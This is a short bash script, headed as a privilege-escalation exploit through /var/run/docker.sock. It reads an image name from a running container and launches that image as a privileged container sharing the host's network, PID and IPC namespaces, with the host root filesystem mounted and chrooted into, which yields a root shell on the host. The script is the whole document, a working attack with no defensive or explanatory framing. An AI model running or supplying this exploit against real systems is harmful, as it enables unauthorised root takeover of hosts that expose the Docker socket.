#!/bin/bash

# Privilege Escalation through /var/run/docker.sock exploitation

echo "[*] Getting Container Image..."
image=$(docker ps --no-trunc --format '{{.Image}}')
echo "[+] Extracted Image: ${image}"
echo "[*] Trying to get Shell..."
docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host $image chroot /host